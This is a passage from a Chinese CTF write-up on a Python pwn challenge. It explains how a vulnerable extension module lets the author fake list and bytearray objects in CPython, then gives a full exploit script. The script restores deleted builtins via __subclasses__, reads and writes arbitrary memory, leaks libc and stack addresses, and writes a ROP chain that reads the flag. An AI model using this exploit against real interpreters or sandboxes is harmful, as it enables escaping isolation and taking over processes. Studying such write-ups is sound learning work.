         * Items must normally not be NULL, except during construction when
         * the list is not yet visible outside the function that builds it.
         */
        Py_ssize_t allocated;
    } PyListObject;
还有dict：
    typedef struct {
        PyObject_HEAD
        /* Number of items in the dictionary */
        Py_ssize_t ma_used;
        /* Dictionary version: globally unique, value change each time
           the dictionary is modified */
        uint64_t ma_version_tag;
        PyDictKeysObject *ma_keys;
        /* If ma_values is NULL, the table is "combined": keys and values
           are stored in ma_keys.
           If ma_values is not NULL, the table is splitted:
           keys are stored in ma_keys and values are stored in ma_values */
        PyObject **ma_values;
    } PyDictObject;
看起来差不了太多，感觉dict的对象更麻烦一些，list里就是用一个指针数组保存了list里对象的指针，然后保存了size。由于我们在瞎搞python内部，最简单的总是最好的，可以避免一些想不到的错误。
好了，我们知道了list的具体结构，我们也可以将任意位置当做list来处理，那将什么地址拿来处理才有效呢？我们需要一段连续的地址空间。
于是我想到了str，当然，为了避免奇怪的编码问题，我想到了bytes:
    typedef struct {
        PyObject_VAR_HEAD
        Py_hash_t ob_shash;
        char ob_sval[1];
        /* Invariants:
         *     ob_sval contains space for 'ob_size+1' elements.
         *     ob_sval[ob_size] == 0.
         *     ob_shash is the hash of the string or -1 if not computed yet.
         */
    } PyBytesObject;
所以在`ob_sval`之后的应该就是可控的连续内容了，加上我们有`id`函数，地址泄露是不需要担心的，这样我们的控制能力就又强了一点，现在可以做到伪造任意list了。
接下来原本我是打算从list里直接去做到任意地址读写，直到我想起来。。。python里都是对象！所以那个list的指针数组，指向的内容，也都是对象的指针，那么例如我写入某个list
a的`a[0]`，其实是往那个指针数组的`[0]`位置写了一个地址！
所以用list做任意读写并不现实，那么我们需要找一个能够直接写入值而非对象的类型。之前都想到bytes了，现在需要他可以更改，那就bytearray嘛。
    typedef struct {
        PyObject_VAR_HEAD
        Py_ssize_t ob_alloc; /* How many bytes allocated in ob_bytes */
        char *ob_bytes;      /* Physical backing buffer */
        char *ob_start;      /* Logical start inside ob_bytes */
        /* XXX(nnorwitz): should ob_exports be Py_ssize_t? */
        int ob_exports;      /* How many buffer exports */
    } PyByteArrayObject;
看到`ob_bytes`大家应该就放心了，这直接就是一个缓冲区，可以直接更改，size也可控，所以如果能伪造一个bytearray，就可以任意读写了。
不过事情没这么简单，要伪造bytearray，我们应当可以把一个任意地址解释为bytearray，但是具有漏洞的对象限制了类型，只允许使用list，dict和整数，所以只能解释为list和dict，所以我们能伪造的只有list或者dict，dict太复杂，我选择使用list。
还好的是，并不是伪造list就没用了，刚才我们说到，伪造list可以让我把一个对象指针写入任意地址，这个对象指针也是可控的，所以我们可以把那个对象指针直接写入到`bytearray`的`ob_bytes`和`ob_start`那嘛，这样就可以用这个bytearray去修改那个对象指针了。
所以总结一下思路：
  1. 建立一个目标bytearray
  2. 利用bytes伪造一个list，`id(X) + 0x20`即为写入的bytes内容的地址（这个可以调试得到），指针数组设置为bytearray地址的`ob_bytes`位置
  3. 利用构造的list，将一个新的bytearray的地址写入到第一步中的bytearray的`ob_bytes`和`ob_start`位置
  4. 这样就已经做到任意读写了，每次修改第一步的bytearray，让他的内容是一个伪造的bytearray，地址指向需要读写的地址，然后使用第三步的进行读写
有了任意读写之后就很简单了，有了打开的flag的fd，有`readv`和`write`，构造好数据进行读取即可。当然，这意味着我们需要连续调用函数，那么思路就是执行shellcode或者rop，想想觉得rop比较好做，所以我采用的方法是泄露environ（environ在bin里，比较神奇，需要调试一下），然后泄露栈地址，再把payload喷到栈上。
BUT!
思考一下我们的思路有啥问题吗？
没有bytearary！也没有bytes！甚至都没有list！
当时看到这个问题我还是慌了一下，不过还好随即找到了绕过方法，由于我们只是需要type，绕过还是比较简单的：
    subs = [].__class__.mro()[1].__subclasses__()
    for cls in subs:
        if cls.__name__ == 'bytearray':
            bytearray = cls
        if cls.__name__ == 'list':
            list = cls
        if cls.__name__ == 'bytes':
            bytes = cls
## exp
    '''
    from sys import modules
    del modules['os']
    import Collection
    keys = list(__builtins__.__dict__.keys())
    for k in keys:
        if k != 'id' and k != 'hex' and k != 'print' and k != 'range':
            del __builtins__.__dict__[k]
    '''
    subs = [].__class__.mro()[1].__subclasses__()
    for cls in subs:
        if cls.__name__ == 'bytearray':
            bytearray = cls
        if cls.__name__ == 'list':
            list = cls
        if cls.__name__ == 'bytes':
            bytes = cls
    def p64(x):
        result = b''
        for i in range(8):
            result += bytes([x & 0xff])
            x >>= 8
        return result
    def u64(s):
        result = 0
        for i in range(8):
            result += s[i] << (8 * i)
        return result
    buf = bytearray(b'1' * 0x1000)
    fake_list = p64(0x10) + p64(id(list)) + p64(0x100) + p64(id(buf) + 0x20) + p64(id(buf))
    print('buf @ 0x%x' % id(buf))
    print('fake_list @ 0x%x' % id(fake_list))
    a = Collection.Collection({'a': [1], 'b': 2, 'c': 3})
    b = Collection.Collection({'b': id(fake_list) + 0x20, 'a': [2], 'c': 3})
    some = bytearray(b'2' * 0x1000)
    b.get('a')[0] = some
    b.get('a')[1] = some
    def set_addr(addr):
        payload = p64(0x10) + p64(id(bytearray)) + p64(0x1000) + p64(0x1001) + \
                p64(addr) + p64(addr)
        for i in range(6 * 8):
            buf[i] = payload[i]
    def arbitrary_read(addr, length):
        set_addr(addr) 
        assert length < 0x1000 # can be larger, but .. really?
        return some[:length]
    def arbitrary_write(addr, length, buf):
        set_addr(addr)
        for i in range(length):
            some[i] = buf[i]
    malloc_addr = u64(arbitrary_read(0x9b32f8, 0x8))
    print('malloc @ 0x%x' % malloc_addr)
    libc_base = malloc_addr - 0x97070
    print('libc_base @ 0x%x' % libc_base)
    environ_addr = 0xa4f980
    stack_addr = u64(arbitrary_read(environ_addr, 8))
    print('stack @ 0x%x' % stack_addr)
    write_from = stack_addr - 0x400
    leak_buf_back = 0x9b4000
    pop_rdi = 0x421612
    pop_rsi = 0x42110e
    pop_rdx = 0x4026c1
    ret = 0x455ea2
    iov_struct = p64(leak_buf_back) + p64(0x1000)
    payload = p64(pop_rdi)
    payload += p64(1023)
    payload += p64(pop_rsi)
    payload += p64(id(iov_struct) + 0x20)
    payload += p64(pop_rdx)
    payload += p64(1)
    payload += p64(0x4208b0) # readv(1023, buf, 0x1000)
    payload += p64(pop_rdi)
    payload += p64(0x1)
    payload += p64(pop_rsi)
    payload += p64(leak_buf_back)
    payload += p64(pop_rdx)
    payload += p64(0x1000)
    payload += p64(0x4207e0) # write(1, buf, 0x1000)
    filled = p64(ret) * 0x60 + payload
    arbitrary_write(write_from, (14 + 0x60) * 8, filled)
    #print(b.get('a')[2])
    END_OF_PWN
## 结论
题目并不太难，我讲的比较啰嗦，总的来说python的利用还是比较好写的，对象内存layout非常好找（是的我就是针对v8），大家可以尝试一下，是一个比较好的进阶题目（相对只会做常规libc题来讲）。